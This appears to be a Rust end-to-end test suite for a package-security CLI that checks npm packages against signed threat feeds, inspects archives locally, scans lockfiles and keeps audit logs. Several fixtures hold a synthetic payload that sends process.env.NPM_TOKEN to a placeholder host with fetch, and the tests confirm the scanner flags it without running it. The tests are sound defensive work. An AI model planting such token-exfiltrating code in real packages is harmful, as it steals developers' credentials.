//! End-to-end CLI assessments with signed synthetic feeds and controlled HTTPS.
#![allow(clippy::unwrap_used)]
mod support;
use serde_json::json;
use support::*;

#[test]
fn exact_feed_check_preserves_verdicts_and_enforces_policy_and_freshness() {
    for (classification, extra, expected) in [
        ("malicious", None, 10),
        ("suspicious", None, 0),
        ("suspicious", Some("--ci"), 10),
        ("suspicious", Some("--suspicious=block"), 10),
    ] {
        let home = home(vec![record(classification, "https://registry.npmjs.org")]);
        let mut args = vec![
            "--json", "check", "--eco", "npm", "--name", "fixture", "--ver", "1.0.0",
        ];
        if let Some(extra) = extra {
            args.push(extra);
        }
        let result = result(command(home.path(), &args), expected);
        assert_eq!(result["scope"], "feed_only");
        assert_eq!(
            result["feed_provenance"]["manifest_sha256"]
                .as_str()
                .unwrap()
                .len(),
            64
        );
        assert_eq!(
            result["feed_provenance"]["sources"]
                .as_array()
                .unwrap()
                .len(),
            1
        );
        assert_eq!(
            result["feed_verdict"]["matches"][0]["record"]["classification"],
            classification
        );
        assert!(result["local_analysis"].is_null());
        let audit = std::fs::read_to_string(home.path().join("log/audit.jsonl")).unwrap();
        assert_eq!(
            serde_json::from_str::<serde_json::Value>(audit.trim()).unwrap(),
            result
        );
    }
    for (age, error) in [(3601, None), (0, Some("source failed"))] {
        let home = home(vec![]);
        let state = home.path().join("state.json");
        let cache = home.path().join("cache/feed.json");
        std::fs::remove_file(state).unwrap();
        std::fs::remove_file(cache).unwrap();
        publish(home.path(), vec![], age, error);
        let result = result(
            command(
                home.path(),
                &[
                    "--json", "check", "--eco", "npm", "--name", "fixture", "--ver", "1.0.0",
                ],
            ),
            10,
        );
        assert_eq!(result["decision"]["complete"], false);
    }
}
#[test]
fn local_scope_uses_worker_and_never_executes_hooks() {
    let home = tempfile::tempdir().unwrap();
    let marker = home.path().join("executed");
    let bytes = package(&format!(
        "require('fs').writeFileSync({:?},'executed');fetch('https://example.invalid',{{body:process.env.NPM_TOKEN}});",
        marker.display().to_string()
    ));
    let archive = home.path().join("package.tgz");
    std::fs::write(&archive, &bytes).unwrap();
    let args = [
        "--json",
        "inspect",
        archive.to_str().unwrap(),
        "--eco",
        "npm",
        "--name",
        "fixture",
        "--ver",
        "1.0.0",
    ];
    let report = result(command(home.path(), &args), 0);
    assert_eq!(report["scope"], "local_artifact_only");
    assert_eq!(report["decision"]["action"], "warn");
    assert!(report["feed_verdict"].is_null());
    assert_eq!(
        report["local_analysis"]["artifact_sha256"],
        zoli_intel::feed::sha256(&bytes)
    );
    assert!(!marker.exists());
    let human = command(home.path(), &args[1..]);
    assert!(human.status.success());
    let text = String::from_utf8(human.stdout).unwrap();
    assert!(
        text.contains("Decision: warn")
            && text.contains("ZOLI-LOCAL-001")
            && text.contains("package/index.js")
    );
    let mut args = args.to_vec();
    args.push("--ci");
    result(command(home.path(), &args), 10);
    assert!(!marker.exists());
}
#[test]
fn worker_budget_and_unsupported_executables_are_incomplete() {
    let home = home(vec![]);
    let archive = home.path().join("package.tgz");
    let args = [
        "--json",
        "inspect",
        archive.to_str().unwrap(),
        "--eco",
        "npm",
        "--name",
        "fixture",
        "--ver",
        "1.0.0",
    ];
    std::fs::write(&archive, archive_bytes_with_wasm()).unwrap();
    let value = result(command(home.path(), &args), 12);
    assert_eq!(value["decision"]["complete"], false);
    std::fs::write(&archive, package(&"const x=1;\n".repeat(100_000))).unwrap();
    configure(home.path(), |c| {
        c["analysis"] = json!({"worker_memory_bytes":1})
    });
    let value = result(command(home.path(), &args), 12);
    assert!(
        value["local_analysis"]["gaps"]
            .as_array()
            .unwrap()
            .iter()
            .any(|s| s.as_str().unwrap().contains("worker_failed"))
    );
    configure(home.path(), |c| {
        c["analysis"] = json!({"max_artifact_bytes":1})
    });
    let value = result(command(home.path(), &args), 12);
    assert_eq!(value["local_analysis"]["artifact_sha256"], "");
}
fn archive_bytes_with_wasm() -> Vec<u8> {
    archive(&[
        (
            "package/package.json",
            br#"{"name":"fixture","version":"1.0.0"}"#,
        ),
        ("package/payload.wasm", b"\0asm"),
    ])
}
#[test]
fn missing_config_corrupt_cache_and_audit_failure_never_release_success() {
    let empty = tempfile::tempdir().unwrap();
    for args in [
        vec!["--json", "status"],
        vec!["--json", "update"],
        vec![
            "--json", "check", "--eco", "npm", "--name", "fixture", "--ver", "1.0.0",
        ],
    ] {
        let v = result(command(empty.path(), &args), 1);
        assert_eq!(v["scope"], "error");
    }
    let home = home(vec![]);
    std::fs::write(home.path().join("cache/feed.json"), "corrupt").unwrap();
    result(command(home.path(), &["--json", "status"]), 1);
    let home = support::home(vec![]);
    std::fs::create_dir(home.path().join("log")).unwrap();
    std::fs::write(home.path().join("log/audit.jsonl"), "unfinished").unwrap();
    let v = result(
        command(
            home.path(),
            &[
                "--json", "check", "--eco", "npm", "--name", "fixture", "--ver", "1.0.0",
            ],
        ),
        1,
    );
    assert_eq!(v["scope"], "error");
    assert!(v["decision"].is_null());
}
#[test]
fn full_private_registry_scan_has_integrity_graph_local_evidence_and_audit() {
    for (source, ci, expected) in [
        ("module.exports = 42;", false, 0),
        (
            "fetch('https://example.invalid',{body:process.env.NPM_TOKEN});",
            false,
            0,
        ),
        (
            "fetch('https://example.invalid',{body:process.env.NPM_TOKEN});",
            true,
            10,
        ),
    ] {
        let bytes = package(source);
        let response = bytes.clone();
        let server = Server::new(move |_| (200, vec![], response.clone()));
        let home = home(vec![]);
        configure(home.path(), |c| {
            c["registries"] = json!({"npm":[server.registry()]})
        });
        let project_dir = tempfile::tempdir().unwrap();
        let lock = project(
            project_dir.path(),
            &format!(
                "{}/npm/fixture.tgz?signature=DO_NOT_LEAK_QUERY",
                server.origin
            ),
            &bytes,
        );
        let npmrc = home.path().join("trusted.npmrc");
        std::fs::write(
            &npmrc,
            format!(
                "registry={}/npm/\n//{}/npm/:_authToken=DO_NOT_LEAK_TOKEN\n",
                server.origin,
                server.origin.trim_start_matches("https://")
            ),
        )
        .unwrap();
        let mut args = vec![
            "--json",
            "scan",
            "--lockfile",
            lock.to_str().unwrap(),
            "--npmrc",
            npmrc.to_str().unwrap(),
        ];
        if ci {
            args.push("--ci");
        }
        let value = result(command(home.path(), &args), expected);
        assert_eq!(value["scope"], "dependency_tree");
        assert_eq!(value["decision"]["complete"], true);
        assert_eq!(
            value["packages"][0]["package"]["introduced_by"],
            json!(["node_modules/fixture"])
        );
        assert_eq!(value["packages"][0]["local_analysis"]["complete"], true);
        assert!(server.requests.lock().unwrap()[0].contains("Bearer DO_NOT_LEAK_TOKEN"));
        let audit = std::fs::read_to_string(home.path().join("log/audit.jsonl")).unwrap();
        assert!(!audit.contains("DO_NOT_LEAK_TOKEN") && !audit.contains("DO_NOT_LEAK_QUERY"));
        assert!(value["timings_ms"]["local_inspection"].as_u64().is_some());
    }
}
#[test]
fn private_opt_in_integrity_and_unavailable_artifacts_refuse_scan() {
    let bytes = package("module.exports=1;");
    let response = bytes.clone();
    let server = Server::new(move |_| (200, vec![], response.clone()));
    let home = home(vec![]);
    let project_dir = tempfile::tempdir().unwrap();
    let lock = project(
        project_dir.path(),
        &format!("{}/npm/fixture.tgz", server.origin),
        &bytes,
    );
    let npmrc = home.path().join("trusted.npmrc");
    std::fs::write(&npmrc, format!("registry={}/npm", server.origin)).unwrap();
    let args = [
        "--json",
        "scan",
        "--lockfile",
        lock.to_str().unwrap(),
        "--npmrc",
        npmrc.to_str().unwrap(),
    ];
    let mut registry = server.registry();
    registry["allow_private_network"] = json!(false);
    configure(home.path(), |c| c["registries"] = json!({"npm":[registry]}));
    result(command(home.path(), &args), 1);
    assert!(server.requests.lock().unwrap().is_empty());
    configure(home.path(), |c| {
        c["registries"] = json!({"npm":[server.registry()]})
    });
    let mut metadata: serde_json::Value =
        serde_json::from_slice(&std::fs::read(&lock).unwrap()).unwrap();
    metadata["packages"]["node_modules/fixture"]["integrity"] =
        json!(integrity(b"different bytes"));
    std::fs::write(&lock, serde_json::to_vec(&metadata).unwrap()).unwrap();
    result(command(home.path(), &args), 1);
    metadata["packages"]["node_modules/fixture"]["integrity"] = json!("sha1-AAAA");
    std::fs::write(&lock, serde_json::to_vec(&metadata).unwrap()).unwrap();
    let v = result(command(home.path(), &args), 12);
    assert_eq!(v["decision"]["complete"], false);
}
#[test]
fn bundled_packages_are_queried_without_inventing_child_artifact_hashes() {
    let bytes = archive(&[
        (
            "package/package.json",
            br#"{"name":"fixture","version":"1.0.0","dependencies":{"child":"1.0.0"}}"#,
        ),
        ("package/index.js", b"module.exports=1;"),
        (
            "package/node_modules/child/package.json",
            br#"{"name":"child","version":"1.0.0"}"#,
        ),
        ("package/node_modules/child/index.js", b"module.exports=2;"),
    ]);
    let response = bytes.clone();
    let server = Server::new(move |_| (200, vec![], response.clone()));
    let registry = format!("{}/npm", server.origin);
    let mut malicious = record("malicious", &registry);
    let affected = &mut malicious.affected.as_mut().unwrap()[0];
    affected.package.name = "child".into();
    affected.package.sha256 = "ab".repeat(32);
    let home = home(vec![malicious]);
    configure(home.path(), |c| {
        c["registries"] = json!({"npm":[server.registry()]})
    });
    let project_dir = tempfile::tempdir().unwrap();
    let lock = project(
        project_dir.path(),
        &format!("{registry}/fixture.tgz"),
        &bytes,
    );
    let mut metadata: serde_json::Value =
        serde_json::from_slice(&std::fs::read(&lock).unwrap()).unwrap();
    metadata["packages"]["node_modules/fixture"]["dependencies"] = json!({"child":"1.0.0"});
    metadata["packages"]["node_modules/fixture/node_modules/child"] =
        json!({"version":"1.0.0","inBundle":true});
    std::fs::write(&lock, serde_json::to_vec(&metadata).unwrap()).unwrap();
    let npmrc = home.path().join("trusted.npmrc");
    std::fs::write(&npmrc, format!("registry={registry}")).unwrap();
    let args = [
        "--json",
        "scan",
        "--lockfile",
        lock.to_str().unwrap(),
        "--npmrc",
        npmrc.to_str().unwrap(),
    ];
    let value = result(command(home.path(), &args), 10);
    let child = &value["packages"][1];
    assert_eq!(child["analysis_container"], "node_modules/fixture");
    assert!(child["local_analysis"].is_null());
    assert!(child["package"]["identity"].get("sha256").is_none());
    assert_eq!(
        child["feed_verdict"]["matches"][0]["certainty"],
        "uncertain"
    );
    assert_eq!(child["decision"]["exit_code"], 10);
    metadata["packages"]
        .as_object_mut()
        .unwrap()
        .remove("node_modules/fixture/node_modules/child");
    metadata["packages"]["node_modules/fixture"]
        .as_object_mut()
        .unwrap()
        .remove("dependencies");
    std::fs::write(&lock, serde_json::to_vec(&metadata).unwrap()).unwrap();
    let value = result(command(home.path(), &args), 12);
    assert!(
        value["inventory"]["gaps"]
            .as_array()
            .unwrap()
            .iter()
            .any(|g| g["reason"] == "unrecorded_bundled_package_identity")
    );
}
#[test]
fn concurrent_processes_append_complete_audit_records() {
    let home = home(vec![]);
    std::thread::scope(|scope| {
        for _ in 0..8 {
            let home = home.path();
            scope.spawn(move || {
                result(command(home, &["--json", "status"]), 0);
            });
        }
    });
    let log = std::fs::read_to_string(home.path().join("log/audit.jsonl")).unwrap();
    assert!(log.ends_with('\n'));
    assert_eq!(log.lines().count(), 8);
    for line in log.lines() {
        let v: serde_json::Value = serde_json::from_str(line).unwrap();
        assert_eq!(v["schema"], 1);
        assert_eq!(v["scope"], "feed_status");
    }
}
